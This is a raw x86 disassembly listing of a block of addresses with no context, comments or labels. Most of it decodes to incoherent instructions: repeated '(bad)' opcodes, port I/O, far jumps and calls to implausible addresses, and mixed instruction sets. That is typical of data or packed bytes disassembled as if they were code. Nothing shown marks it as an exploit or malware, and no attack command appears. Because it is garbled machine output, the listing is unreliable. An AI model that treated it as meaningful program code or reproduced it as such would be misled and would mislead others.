  414a01:	push   DWORD PTR [ebx+edx*8]
  414a04:	push   ebx
  414a05:	(bad)  
  414a06:	xor    al,0xb7
  414a08:	push   ebx
  414a09:	pusha  
  414a0a:	sub    eax,0x522c79c7
  414a0f:	mov    dh,0x37
  414a11:	dec    ebp
  414a12:	jnp    0x414a38
  414a14:	mov    al,0x5d
  414a16:	cmp    ah,BYTE PTR [ebp+ebp*4+0x38a77e40]
  414a1d:	je     0x4149c6
  414a1f:	sub    al,0xa8
  414a21:	xor    BYTE PTR ds:0x82756c8f,ch
  414a27:	out    0x3,eax
  414a29:	or     eax,0xad06cf
  414a2e:	add    BYTE PTR [eax],al
  414a30:	add    BYTE PTR [eax],al
  414a32:	sbb    BYTE PTR [ebx+0x0],bh
  414a35:	hlt    
  414a36:	push   cs
  414a37:	jp     0x414a3a
  414a39:	shl    BYTE PTR [ebx-0xbbefe5a],0x2a
  414a40:	cld    
  414a41:	out    0xf9,eax
  414a43:	and    DWORD PTR [ebx+0x56],0xcc81a520
  414a4a:	and    al,BYTE PTR [edx]
  414a4c:	jbe    0x414a4d
  414a4e:	adc    ebp,ebp
  414a50:	mov    BYTE PTR [esi+0x34e71a72],ah
  414a56:	jns    0x414a5a
  414a58:	call   0xfde6d0dd
  414a5d:	jb     0x414a10
  414a5f:	sbb    cl,0x95
  414a62:	outs   dx,DWORD PTR ds:[esi]
  414a63:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414a64:	jae    0x414a83
  414a66:	loopne 0x414a9a
  414a68:	lock xor DWORD PTR [esi+0x51],0x68
  414a6d:	xor    BYTE PTR [ecx+0x2],bh
  414a70:	add    BYTE PTR [ecx],dl
  414a72:	push   ds
  414a73:	fsin   
  414a75:	call   0x86cee49f
  414a7a:	fldenv [ebp+edi*8-0x7a6636a4]
  414a81:	inc    esi
  414a82:	enter  0xf6a4,0xef
  414a86:	ja     0x414a7f
  414a88:	cmp    DWORD PTR [eax+0x76],0x2
  414a8c:	add    BYTE PTR [ecx+0x3d],dl
  414a8f:	mov    bh,0x41
  414a91:	jmp    0xda555c9f
  414a96:	add    BYTE PTR [eax],al
  414a98:	add    BYTE PTR [eax],al
  414a9a:	add    BYTE PTR [esi-0x13d717fe],dh
  414aa0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414aa1:	std    
  414aa2:	jb     0x414a5c
  414aa4:	test   BYTE PTR [eax+0x437d393f],0x95
  414aab:	cmc    
  414aac:	stos   BYTE PTR es:[edi],al
  414aad:	or     al,0x1b
  414aaf:	mov    DWORD PTR [ebx+0x1],edi
  414ab2:	add    BYTE PTR [edi+0x6d720c59],cl
  414ab8:	fwait
  414ab9:	inc    edx
  414aba:	cld    
  414abb:	adc    esi,DWORD PTR [esi]
  414abd:	xchg   DWORD PTR [ebx+0x10],ecx
  414ac0:	outs   dx,DWORD PTR ds:[esi]
  414ac1:	mov    ebp,0x20020c00
  414ac6:	je     0x414a98
  414ac8:	cmp    al,0xc
  414acb:	rcl    BYTE PTR [esi-0x12223e0d],cl
  414ad1:	cmp    DWORD PTR [ebx+0x43cc71e9],ecx
  414ad7:	int3   
  414ad8:	add    cl,al
  414ada:	mov    esi,0x3f6538
  414adf:	xor    al,0xa
  414ae1:	call   DWORD PTR [ebx-0x528b3f83]
  414ae8:	push   esi
  414ae9:	das    
  414aea:	mov    ebx,DWORD PTR [ecx-0x63bc337b]
  414af0:	add    cl,BYTE PTR [ecx]
  414af2:	lock push 0xfd530042
  414af8:	push   esi
  414af9:	adc    DWORD PTR [edx+esi*4],edi
  414afc:	inc    ecx
  414afd:	add    BYTE PTR [ebx+0x0],cl
  414b03:	add    BYTE PTR [edi-0x72f33b7e],bl
  414b09:	add    dh,al
  414b0b:	int3   
  414b0c:	dec    edi
  414b0d:	inc    BYTE PTR [esi-0xdbab83]
  414b13:	sub    BYTE PTR [ecx-0x302800a6],dl
  414b19:	(bad)  
  414b1b:	or     al,0x9f
  414b1d:	jbe    0x414b87
  414b1f:	aam    0x18
  414b21:	cmp    eax,0xf921ff00
  414b26:	push   cs
  414b27:	inc    eax
  414b28:	dec    esp
  414b29:	pop    eax
  414b2a:	inc    ecx
  414b2b:	call   0x84298ef7
  414b30:	jne    0x414b08
  414b32:	xchg   edi,eax
  414b33:	sbb    BYTE PTR [esi-0x24],ch
  414b36:	pop    es
  414b37:	or     eax,0xfda76af7
  414b3c:	sbb    ch,BYTE PTR [eax-0x3f]
  414b3f:	cmp    DWORD PTR [eax+0x35194977],edi
  414b45:	cmc    
  414b46:	mov    al,0xd8
  414b48:	sahf   
  414b49:	repnz lds eax,FWORD PTR [esi*2-0xd0f8193]
  414b51:	(bad)  
  414b52:	stc    
  414b53:	out    0x2a,eax
  414b55:	mov    ebp,0x64e2fdaa
  414b5a:	adc    eax,ebp
  414b5c:	and    bh,BYTE PTR [ebp+0x64d2fdaa]
  414b62:	add    eax,0xaabd1ae8
  414b67:	std    
  414b68:	add    BYTE PTR [eax],al
  414b6a:	add    BYTE PTR [eax],al
  414b6c:	add    dl,al
  414b6e:	test   ch,dl
  414b70:	out    0x12,eax
  414b72:	jge    0x414b1e
  414b74:	std    
  414b75:	mov    dl,0x84
  414b77:	icebp  
  414b78:	out    0xa,eax
  414b7a:	jge    0x414b26
  414b7c:	std    
  414b7d:	mov    ds:0x2e7ed24,al
  414b82:	jge    0x414b2e
  414b84:	std    
  414b85:	(bad)  
  414b86:	and    al,0x41
  414b88:	add    DWORD PTR [ebx+0x4bfcf82e],0xffffffd3
  414b8f:	jl     0x414bf7
  414b91:	jp     0x414b56
  414b93:	dec    edi
  414b94:	call   0xfdea7f8f
  414b99:	retf   
  414b9a:	pop    eax
  414b9b:	stos   BYTE PTR es:[edi],al
  414b9c:	jbe    0x414c17
  414b9e:	shr    DWORD PTR [esi+eiz*2],1
  414ba1:	pop    edx
  414ba2:	gs stos BYTE PTR es:[edi],al
  414ba4:	jbe    0x414c23
  414ba6:	shl    DWORD PTR [esi+eiz*2],0x4a
  414baa:	push   ebp
  414bab:	stos   BYTE PTR es:[edi],al
  414bac:	jbe    0x414c13
  414bae:	add    cl,BYTE PTR [edi-0x615c2ce4]
  414bb4:	(bad)  
  414bb5:	enter  0x8f77,0x80
  414bb9:	sub    BYTE PTR [edi],ch
  414bbb:	cmc    
  414bbc:	push   ecx
  414bbd:	in     al,dx
  414bbe:	stos   DWORD PTR es:[edi],eax
  414bbf:	adc    dh,BYTE PTR [edx-0x200d0083]
  414bc5:	jle    0x414c46
  414bc7:	test   DWORD PTR [ebx],ecx
  414bc9:	sbb    eax,0xaa6eb5
  414bce:	xor    al,0xdc
  414bd0:	mov    al,0x0
  414bd2:	add    BYTE PTR [eax],al
  414bd4:	add    BYTE PTR [eax],al
  414bd6:	fwait
  414bd7:	inc    ebx
  414bd8:	push   eax
  414bd9:	inc    eax
  414bda:	pop    ebx
  414bdb:	mov    ds:0x96fc5056,eax
  414be0:	push   0xffffff9f
  414be2:	fnsave [edi-0x54]
  414be5:	sti    
  414be6:	cmc    
  414be7:	xchg   esi,eax
  414be8:	fwait
  414be9:	push   esi
  414bea:	sub    ecx,DWORD PTR [ebx+0x36]
  414bed:	xor    esi,DWORD PTR [ecx+0x75]
  414bf0:	mov    bl,0xdf
  414bf2:	mov    bl,BYTE PTR [edx+0x275d270]
  414bf8:	arpl   bx,ax
  414bfa:	cmp    BYTE PTR [esi+0x73],0x4
  414bfe:	jne    0x414c02
  414c00:	fcmove st,st(6)
  414c02:	sbb    edi,DWORD PTR [ebx+0x286dfab]
  414c08:	call   0xda1f7d88
  414c0d:	fwait
  414c0e:	ins    DWORD PTR es:[edi],dx
  414c0f:	shl    bh,1
  414c11:	add    ebp,esp
  414c13:	mov    dl,0xf6
  414c15:	imul   esi,DWORD PTR [ecx],0x30f8f9de
  414c1b:	ds jmp 0x414c2d
  414c1e:	les    ecx,FWORD PTR [edi+0x3a]
  414c21:	push   esp
  414c22:	retf   
  414c23:	mov    ds:0x42868fdc,eax
  414c28:	out    0x51,eax
  414c2a:	cli    
  414c2b:	cmp    eax,0x9a7d0d00
  414c30:	in     eax,dx
  414c31:	inc    esp
  414c32:	or     al,0xa5
  414c34:	aaa    
  414c35:	inc    ebp
  414c36:	push   ebp
  414c37:	or     ecx,DWORD PTR ds:0x65
  414c3d:	add    BYTE PTR [eax],al
  414c3f:	pop    ds
  414c40:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414c41:	std    
  414c42:	jmp    0xeaab9e08
  414c47:	leave  
  414c48:	push   ecx
  414c49:	std    
  414c4a:	std    
  414c4b:	cmp    cl,BYTE PTR [edi-0x3]
  414c4e:	cmc    
  414c4f:	xor    dh,BYTE PTR [edi]
  414c51:	std    
  414c52:	std    
  414c53:	sub    ch,bh
  414c55:	cld    
  414c56:	aam    0x9e
  414c58:	cmovo  ebp,ecx
  414c5b:	jg     0x414c9b
  414c5d:	and    al,0x5
  414c5f:	loopne 0x414c22
  414c61:	or     eax,0xfda3816d
  414c66:	jmp    0x72498bcc
  414c6b:	jno    0x414bef
  414c6d:	js     0x414c50
  414c6f:	ja     0x414cd5
  414c71:	pusha  
  414c72:	mov    esp,0xe4740236
  414c77:	dec    esp
  414c78:	sbb    dh,BYTE PTR [ebx-0x57]
  414c7b:	jbe    0x414c6e
  414c7d:	(bad)  
  414c7e:	imul   ebx,DWORD PTR [ebp-0x22],0xf541eb41
  414c85:	xchg   edx,eax
  414c86:	sub    BYTE PTR [esi+0x23],bl
  414c89:	fucomip st,st(1)
  414c8b:	jbe    0x414c0f
  414c8d:	add    BYTE PTR [eax-0x32],ch
  414c90:	add    ebp,esi
  414c92:	in     eax,0xa
  414c94:	xor    edx,DWORD PTR [ecx-0x12]
  414c97:	inc    esi
  414c98:	cli    
  414c99:	addr16 cmp eax,0xde00424a
  414c9f:	mov    ds:0x3f4be6,al
  414ca4:	add    BYTE PTR [eax],al
  414ca6:	add    BYTE PTR [eax],al
  414ca8:	sbb    al,0x17
  414caa:	and    al,0x29
  414cac:	or     al,0xf6
  414cae:	lahf   
  414caf:	add    BYTE PTR [ecx],bh
  414cb1:	inc    esi
  414cb2:	add    BYTE PTR [ebx+0xff0af0c],cl
  414cb8:	fcom   DWORD PTR [ebx]
  414cba:	add    BYTE PTR [eax],al
  414cbc:	dec    esp
  414cbd:	add    BYTE PTR [edi],dl
  414cbf:	lea    edx,[eax+0x45845a2]
  414cc5:	inc    esi
  414cc6:	inc    ecx
  414cc7:	add    DWORD PTR [esi+edi*8],ebx
  414cca:	(bad)  
  414ccb:	dec    DWORD PTR [esi+eiz*1]
  414cce:	push   0xffffffff
  414cd0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414cd1:	ret    0x5650
  414cd4:	xchg   ebx,eax
  414cd5:	adc    BYTE PTR [ebp+edx*1+0x1a6a065c],bl
  414cdc:	mov    eax,ds:0x344823e9
  414ce1:	jle    0x414d02
  414ce3:	inc    ebp
  414ce4:	fld    QWORD PTR ds:0x1ed47d87
  414cea:	add    edi,DWORD PTR [ecx]
  414cec:	and    al,0xa6
  414cee:	jae    0x414d24
  414cf0:	xor    edx,ebp
  414cf2:	sbb    ecx,DWORD PTR [ebp+0x5045c218]
  414cf8:	push   ecx
  414cf9:	loope  0x414d1e
  414cfb:	and    al,0xdc
  414cfd:	jge    0x414d7e
  414cff:	jns    0x414c94
  414d01:	push   0x7f
  414d03:	les    esp,FWORD PTR [eax-0x58813fe0]
  414d09:	std    
  414d0a:	(bad)  
  414d0b:	inc    DWORD PTR [eax]
  414d0d:	add    BYTE PTR [eax],al
  414d0f:	add    BYTE PTR [eax],al
  414d11:	mov    WORD PTR ds:0xf173ff6a,fs
  414d17:	and    esp,DWORD PTR [edx+ebp*8]
  414d1a:	push   0x11
  414d1c:	pushf  
  414d1d:	test   eax,0x8ff0045
  414d22:	rcr    DWORD PTR [ecx],0xe8
  414d25:	xchg   dl,ah
  414d27:	cli    
  414d28:	jmp    edi
  414d2a:	mov    eax,ds:0x37570fc
  414d2f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414d30:	jo     0x414ccb
  414d32:	fcom   QWORD PTR [eax+0x56]
  414d35:	pop    edx
  414d36:	mov    esi,0xabb51389
  414d3b:	cmp    al,0x74
  414d3e:	fdivrp st(1),st
  414d40:	push   eax
  414d41:	lock out 0xdf,al
  414d44:	sub    esp,DWORD PTR [ebp+0x5d244016]
  414d4a:	fistp  DWORD PTR [ebx]
  414d4c:	adc    DWORD PTR [ebp-0x55],esi
  414d4f:	loope  0x414da6
  414d51:	cmp    ah,bh
  414d53:	fistp  QWORD PTR [ebx]
  414d55:	jno    0x414d02
  414d57:	add    DWORD PTR [eax],eax
  414d59:	cld    
  414d5a:	(bad)  
  414d5b:	fbstp  TBYTE PTR [ebx]
  414d5d:	or     bh,BYTE PTR [esi-0x544aec93]
  414d63:	cmp    al,0x74
  414d66:	mov    esi,0x7717ef7
  414d6b:	in     al,0xc7
  414d6d:	jne    0x414d1a
  414d6f:	add    DWORD PTR [edx+edi*1+0x59],esi
  414d73:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414d74:	adc    eax,DWORD PTR [eax]
  414d76:	add    BYTE PTR [eax],al
  414d78:	add    BYTE PTR [eax],al
  414d7a:	add    eax,0xd20041be
  414d7f:	push   esi
  414d80:	frstor [ebx]
  414d82:	retf   0x91bd
  414d85:	adc    esi,DWORD PTR ds:0x9174a6ab
  414d8b:	add    esp,DWORD PTR [ebp+0x41960513]
  414d91:	add    BYTE PTR [ebx-0xaef2292],ch
  414d97:	mov    ds,ebp
  414d99:	adc    BYTE PTR [edi-0x68],dh
  414d9c:	jg     0x414d1f
  414d9e:	xchg   ebx,eax
  414d9f:	lahf   
  414da0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414da1:	std    
  414da2:	add    edi,ecx
  414da4:	in     eax,dx
  414da5:	out    0xf2,eax
  414da7:	xchg   BYTE PTR [esi+0x5b017afd],ah
  414dad:	loopne 0x414d59
  414daf:	stos   BYTE PTR es:[edi],al
  414db0:	gs pop ds
  414db2:	push   0xa44636a0
  414db7:	ret    0x7b32
  414dba:	push   esi
  414dbb:	ds test eax,0x33a152ff
  414dc1:	loopne 0x414d49
  414dc3:	stos   BYTE PTR es:[edi],al
  414dc4:	cmp    DWORD PTR [eax],esp
  414dc6:	inc    eax
  414dc7:	mov    al,ds:0xda912fae
  414dcc:	mov    ds,WORD PTR [ecx+ebx*4]
  414dcf:	lahf   
  414dd0:	sahf   
  414dd1:	sbb    DWORD PTR [ecx-0x1003e177],ecx
  414dd7:	push   ds
  414dd8:	ret    
  414dd9:	repz ret 0xbcaa
  414ddd:	aas    
  414dde:	add    BYTE PTR [eax],al
  414de0:	add    BYTE PTR [eax],al
  414de2:	add    BYTE PTR [edx],dl
  414de4:	mov    al,ds:0xfe514770
  414de9:	add    DWORD PTR [ebp-0x71],0xee0300ee
  414df0:	inc    esi
  414df1:	or     esp,esp
  414df3:	inc    edx
  414df4:	mov    esp,DWORD PTR [ebx+0x3f378adf]
  414dfa:	mov    esp,0x4e4e9f52
  414dff:	repnz inc esi
  414e01:	or     ebx,esp
  414e03:	fcmovbe st,st(7)
  414e05:	ret    0xc8a6
  414e08:	mov    ebp,DWORD PTR [ebx+0x2f8396df]
  414e0e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414e0f:	inc    ecx
  414e10:	fcmovu st,st(1)
  414e12:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414e13:	ins    BYTE PTR es:[edi],dx
  414e14:	ret    
  414e15:	xchg   ebp,eax
  414e16:	fdiv   st(5),st
  414e18:	inc    esi
  414e19:	retf   
  414e1a:	or     ebp,esi
  414e1c:	push   es
  414e1d:	dec    edi
  414e1e:	in     al,dx
  414e1f:	adc    BYTE PTR [esi],0xdc
  414e22:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414e23:	inc    ebp
  414e24:	lahf   
  414e25:	aam    0x97
  414e27:	addr16 inc edx
  414e29:	add    cl,ch
  414e2b:	mov    DWORD PTR es:[ebp+eax*8+0x72],eax
  414e30:	popf   
  414e31:	xor    al,0xa1
  414e33:	adc    DWORD PTR [edx-0x76891796],edx
  414e39:	inc    esp
  414e3a:	or     eax,0xd1394655
  414e3f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414e40:	mov    ch,0x89
  414e42:	inc    ebp
  414e43:	push   ebp
  414e44:	mul    edi
  414e46:	fild   DWORD PTR [eax]
  414e48:	add    BYTE PTR [eax],al
  414e4a:	add    BYTE PTR [eax],al
  414e4c:	push   0xffffff9d
  414e4e:	std    
  414e4f:	fs mov ch,0xe6
  414e52:	sbb    ebx,DWORD PTR [ecx]
  414e54:	ret    0x2446
  414e57:	add    ecx,ecx
  414e59:	mov    eax,DWORD PTR [ebp+eax*8+0x1a]
  414e5d:	dec    edi
  414e5e:	push   esi
  414e5f:	and    DWORD PTR [edx-0x31],0x9a9de900
  414e66:	cmp    DWORD PTR [edx+0x19e78562],eax
  414e6c:	rcr    BYTE PTR [ebp+edi*8+0x4fae7c1c],1
  414e73:	sbb    BYTE PTR [eax+edi*1-0x461a1179],ah
  414e7a:	xchg   DWORD PTR [esi-0x12906212],edi
  414e80:	sbb    DWORD PTR [edx],edx
  414e82:	or     BYTE PTR [ecx+0x1d],al
  414e85:	mov    ecx,0x154be900
  414e8a:	add    al,0x99
  414e8c:	dec    edi
  414e8d:	or     ch,bh
  414e8f:	fsub   st(2),st
  414e91:	repz aas 
  414e93:	jmp    0x753d91d7
  414e98:	jb     0x414e38
  414e9a:	push   eax
  414e9b:	mov    bh,0xe
  414e9d:	out    0xf7,al
  414e9f:	push   ss
  414ea0:	fmul   DWORD PTR [eax-0x619d9dfa]
  414ea6:	mov    BYTE PTR [eax],al
  414ea8:	cwde   
  414ea9:	add    esi,DWORD PTR ds:0x50a1001e
  414eaf:	push   ebx
  414eb0:	add    BYTE PTR [eax],al
  414eb2:	add    BYTE PTR [eax],al
  414eb4:	add    bl,ah
  414eb6:	cli    
  414eb7:	fdiv   QWORD PTR [ecx*8+0x5b534f02]
  414ebe:	or     eax,0x69c12f0
  414ec3:	test   DWORD PTR [edi+0x58],eax
  414ec6:	stos   DWORD PTR es:[edi],eax
  414ec7:	shl    BYTE PTR [eax+edx*2+0x12],0xfd
  414ecc:	jmp    0xe382:0xe8366745
  414ed3:	cli    
  414ed4:	(bad)  
  414ed5:	ds ret 0x5b5e
  414ed9:	adc    eax,0x37334fc3
  414ede:	stos   BYTE PTR es:[edi],al
  414edf:	sbb    esi,DWORD PTR [ebp+0x24]
  414ee2:	addr16 jbe 0x414eed
  414ee5:	hlt    
  414ee6:	loopne 0x414f46
  414ee8:	(bad)  
  414ee9:	jmp    0x414f04
  414eeb:	push   ds
  414eec:	mov    DWORD PTR [edx+0x2],ebx
  414eef:	test   DWORD PTR [esi+0x4],ebx
  414ef2:	sbb    DWORD PTR [esi+0xc],ebx
  414ef5:	addr16 ret 
  414ef7:	xchg   DWORD PTR [eax+0x18],ecx
  414efa:	sbb    eax,0x1ae475c5
  414eff:	dec    eax
  414f00:	or     BYTE PTR [ebp-0x27],ah
  414f03:	or     ebp,ebx
  414f05:	ja     0x414f22
  414f07:	push   eax
  414f08:	or     BYTE PTR [edi-0xddf8da8],al
  414f0e:	sbb    dh,BYTE PTR [eax+0x4]
  414f11:	fist   WORD PTR [ebx+0x37]
  414f14:	into   
  414f15:	jmp    0x0:0x8a10d2
  414f1c:	add    BYTE PTR [eax],al
  414f1e:	popf   
  414f1f:	inc    eax
  414f20:	test   DWORD PTR [eax-0x58],ecx
  414f23:	sbb    eax,0xa98275d2
  414f28:	push   cs
  414f29:	jne    0x414fa0
  414f2b:	mov    al,ds:0xbf2d8742
  414f30:	lock mov edi,0xc2128b6
  414f36:	jne    0x414f48
  414f38:	inc    ecx
  414f39:	or     al,0xb6
  414f3b:	xor    ebp,0x40186d67
  414f41:	add    BYTE PTR [ebp+0x2b],bl
  414f44:	fild   DWORD PTR [ecx]
  414f46:	jne    0x414f40
  414f48:	mov    ch,0x39
  414f4a:	das    
  414f4b:	aas    
  414f4c:	fld    QWORD PTR [eax+0x7e03a3d8]
  414f52:	mov    BYTE PTR [edx],dl
  414f54:	aaa    
  414f55:	cld    
  414f56:	xchg   BYTE PTR [ebx-0x75],ch
  414f59:	inc    ebx
  414f5a:	pop    ecx
  414f5b:	nop
  414f5c:	dec    eax
  414f5d:	or     BYTE PTR [eax+0x7d13dc07],bh
  414f63:	(bad)  
  414f64:	div    BYTE PTR [edi]
  414f66:	rcl    DWORD PTR [ebx+0x28727304],0xc4
  414f6d:	add    bl,BYTE PTR [esi-0x1a]
  414f70:	or     ecx,DWORD PTR ds:0x4b856ae9
  414f76:	or     DWORD PTR [ebp*4-0x427f4af0],ebx
  414f7d:	xor    DWORD PTR ds:0x89c4eb,esi
  414f83:	add    BYTE PTR [eax],al
  414f85:	add    BYTE PTR [eax],al
  414f87:	pop    eax
  414f88:	xor    eax,DWORD PTR [ebp-0x29c416b5]
  414f8e:	mov    edi,0x1dcb7cd
  414f93:	jne    0x414f7e
  414f95:	pop    es
  414f96:	add    BYTE PTR [eax],ch
  414f98:	adc    BYTE PTR [eax-0x7949267f],dh
  414f9e:	arpl   cx,cx
  414fa0:	stos   BYTE PTR es:[edi],al
  414fa1:	cmp    cl,BYTE PTR [ecx-0x27758c5]
  414fa7:	add    BYTE PTR [edx],0x75
  414faa:	jl     0x415021
  414fac:	add    ah,bh
  414fae:	xchg   BYTE PTR [esi],dl
  414fb0:	call   0xcab1:0xda0f36e7
  414fb7:	ss xchg edx,eax
  414fb9:	call   0x7043c4c1
  414fbe:	inc    ecx
  414fbf:	xchg   ecx,eax
  414fc0:	mov    ch,ch
  414fc2:	push   es
  414fc3:	ss call 0x87e7:0x27681ff
  414fcb:	xor    eax,0xb68eff16
  414fd0:	xchg   esi,eax
  414fd1:	vpavgw zmm0{k7}{z},zmm6,ZMMWORD PTR [ebx]
  414fd7:	jne    0x414f74
  414fd9:	xor    al,0x98
  414fdb:	dec    eax
  414fdc:	dec    esi
  414fdd:	mov    bh,0xec
  414fdf:	lahf   
  414fe0:	scas   al,BYTE PTR es:[edi]
  414fe1:	add    BYTE PTR [ecx+0x3d],al
  414fe4:	test   al,0x26
  414fe6:	(bad)  
  414fe7:	mov    dh,0x92
  414fe9:	jo     0x415033
  414feb:	add    BYTE PTR [eax],al
  414fed:	add    BYTE PTR [eax],al
  414fef:	add    BYTE PTR [ecx],ch
  414ff1:	fsub   DWORD PTR [ebp+0x14875e20]
  414ff7:	mov    al,0xec
  414ff9:	add    al,0x62
  414ffb:	push   eax
  414ffc:	or     eax,0x7d05338e
  415001:	sub    bl,dl
  415003:	xor    al,0xee
  415005:	inc    esi
  415006:	out    dx,al
  415007:	or     esp,DWORD PTR [ebp-0x74b82b65]
  41500d:	inc    edx
  41500e:	out    0x86,eax
  415010:	mov    cl,0xe
  415012:	fs ret 
  415014:	or     sp,WORD PTR [edx+0x48]
  415018:	fld    DWORD PTR [edi+0x652ab1d]
  41501e:	out    0x3,eax
  415020:	enter  0x3b4d,0xee
  415024:	mov    ebp,0xdaac009b
  415029:	mov    DWORD PTR [ebx+0x2d],eax
  41502c:	jnp    0x414fc7
  41502e:	cmp    DWORD PTR [edi+0x1ec61e72],ebp
  415034:	sub    eax,0x72978996
  415039:	popf   
  41503a:	inc    ebx
  41503b:	sbb    DWORD PTR [ecx+0x37],edi
  41503e:	in     al,dx
  41503f:	call   0x7c78ea79
  415044:	jmp    0xfd9d:0xd7728c0d
  41504b:	xchg   edx,eax
  41504c:	mov    bh,0xc3
  41504e:	sar    DWORD PTR [edi],0xf8
  415051:	xchg   ecx,eax
  415052:	mov    DWORD PTR [esi+0x0],esp
  415058:	add    BYTE PTR [ecx],dl
  41505a:	out    dx,eax
  41505b:	add    ch,cl
  41505d:	jbe    0x414fe5
  41505f:	rcl    BYTE PTR [ebp+0x74],0x87
  415063:	inc    ebp
  415064:	icebp  
  415065:	xchg   BYTE PTR [edx+0x276e5ce],ch
  41506b:	sub    DWORD PTR [ecx-0x59770fa2],0x0
  415072:	int3   
  415073:	call   0x43c6ae
  415078:	cmp    DWORD PTR gs:[edi],ecx
  41507b:	add    ebx,edx
  41507d:	ss inc edx
  41507f:	pop    esi
  415080:	stos   BYTE PTR es:[edi],al
  415081:	sub    BYTE PTR [ebx+0x5e],bl
  415084:	stos   BYTE PTR es:[edi],al
  415085:	inc    edx
  415086:	mov    esp,ebp
  415088:	sbb    BYTE PTR [eax+0x34],cl
  41508b:	push   ebp
  41508c:	fs mov dl,0x9e
  41508f:	push   eax
  415090:	sub    DWORD PTR [ebx],0xf9e8ff33
  415096:	cdq    
  415097:	xor    DWORD PTR [edi-0x40],edx
  41509a:	pushf  
  41509b:	je     0x4150b2
  41509d:	call   0xf0ac4cd8
  4150a2:	call   0xe807:0xecc80079
  4150a9:	sub    bl,bh
  4150ab:	cli    
  4150ac:	inc    edi
  4150ae:	enter  0x774,0x15
  4150b2:	mov    dh,0x86
  4150b4:	jo     0x41504e
  4150b6:	(bad)  
  4150b7:	lock test DWORD PTR [edx+0x891dfa],ecx
  4150be:	add    BYTE PTR [eax],al
  4150c0:	add    BYTE PTR [eax],al
  4150c2:	ret    0x5e87
  4150c5:	add    al,0x74
  4150c7:	sar    dh,0xff
  4150ca:	jae    0x415051
  4150cc:	jle    0x4150d2
  4150ce:	(bad)  
  4150cf:	sti    
  4150d0:	or     edi,edi
  4150d2:	mov    edx,0x63619066
  4150d7:	arpl   WORD PTR [esi-0x15],dx
  4150da:	pop    ecx
  4150db:	xchg   esi,eax
  4150dd:	jmp    0x415143
  4150df:	(bad)  
  4150e1:	sub    DWORD PTR [ebp+0x1c33fb63],0x43
  4150e8:	pop    esi
  4150e9:	pop    ebx
  4150ea:	add    eax,0x584187bf
  4150ef:	xchg   DWORD PTR ds:0x80db5a53,eax
  4150f5:	leave  
  4150f6:	push   0x88c082af
  4150fb:	xchg   ebx,eax
  4150fc:	push   0xf88714c0
  415101:	push   edi
  415102:	pop    ebp
  415103:	data16 into 
  415105:	popa   
  415106:	add    esp,DWORD PTR [ebx-0x79]
  415109:	lock cdq 
  41510b:	jnp    0x41517e
  41510d:	add    al,0xbe
  41510f:	(bad)
  415112:	pop    edx
  415113:	out    0x95,al
  415115:	add    ah,bl
  415117:	add    eax,0x4344c787
  41511c:	push   edx
  41511d:	add    esp,ecx
  41511f:	fisttp DWORD PTR [ecx+0x424375d8]
  415125:	pop    edi
  415126:	add    BYTE PTR [eax],al
  415128:	add    BYTE PTR [eax],al
  41512a:	add    dl,dl
  41512c:	dec    eax
  41512d:	mov    eax,ecx
  41512f:	ficom  WORD PTR [ecx+0x314d002b]
  415135:	add    DWORD PTR [eax],eax
  415137:	jne    0x4150d5
  415139:	shr    eax,0x39
  41513c:	jge    0x415140
  41513e:	add    BYTE PTR [edx-0x3f],cl
  415141:	cmp    al,0xc1
  415143:	dec    eax
  415144:	adc    al,0xad
  415146:	dec    edi
  415147:	inc    esi
  415148:	pop    eax
  415149:	aam    0xfc
  41514b:	inc    esi
  41514c:	aam    0x89
  41514e:	jnp    0x4150d9
  415150:	ret    0x41f
  415153:	add    eax,esi
  415155:	mov    WORD PTR [esi],es
  415157:	jbe    0x415141
  415159:	es sub ebp,0x8c7601cb
  415160:	xor    eax,0x97358108
  415165:	xor    ebp,edi
  415167:	loopne 0x41510c
  415169:	sahf   
  41516a:	adc    edi,DWORD PTR [ecx-0x9ffbe6f]
  415170:	data16 adc BYTE PTR [ebx-0x2ff31cb],al
  415177:	mov    al,0x4f
  415179:	inc    ecx
  41517a:	cmp    DWORD PTR [edx],0x715dda93
  415180:	fbstp  TBYTE PTR [eax+0x3d77b889]
  415186:	pop    ecx
  415187:	sub    al,0x6d
  415189:	or     BYTE PTR [eax],al
  41518b:	test   al,0x24
  41518d:	mov    al,0x4f
  41518f:	add    BYTE PTR [eax],al
  415191:	add    BYTE PTR [eax],al
  415193:	add    BYTE PTR [esi+0x46fcd0f8],ah
  415199:	mov    edi,DWORD PTR fs:[ebx-0x7]
  41519d:	push   ecx
  41519e:	sbb    eax,DWORD PTR [ebx+esi*2]
  4151a1:	push   esi
  4151a2:	mov    al,BYTE PTR [esi]
  4151a4:	jbe    0x4151a8
  4151a6:	cs es hlt 
  4151a9:	sbb    DWORD PTR [ebx],edx
  4151ab:	add    al,0x63
  4151ad:	sti    
  4151ae:	shl    bl,0xf5
  4151b1:	rol    DWORD PTR [ebx],0x34
  4151b4:	enter  0xef0e,0x9e
  4151b8:	data16 ds aad 0x43
  4151bc:	jne    0x415143
  4151be:	sub    edx,DWORD PTR [eax]
  4151c0:	test   cl,0xb4
  4151c3:	add    ch,BYTE PTR [eax-0xbbcdcc2]
  4151c9:	rcr    bh,0xda
  4151cc:	cmp    dh,bh
  4151ce:	xchg   edx,eax
  4151cf:	mov    dl,0xfc
  4151d1:	or     edi,DWORD PTR ds:[edi]
  4151d4:	sub    al,0xcb
  4151d6:	sub    DWORD PTR [eax],ecx
  4151d8:	jne    0x41520a
  4151da:	xchg   esi,eax
  4151db:	mov    bh,BYTE PTR [ebp-0x7a]
  4151de:	scas   al,BYTE PTR es:[edi]
  4151df:	(bad)  
  4151e0:	std    
  4151e1:	xchg   ecx,eax
  4151e2:	xchg   edi,eax
  4151e3:	stos   DWORD PTR es:[edi],eax
  4151e4:	retf   0xe697
  4151e7:	sahf   
  4151e8:	hlt    
  4151e9:	call   0xe7ae:0x838720e9
  4151f0:	test   eax,0x489e72aa
  4151f5:	cwde   
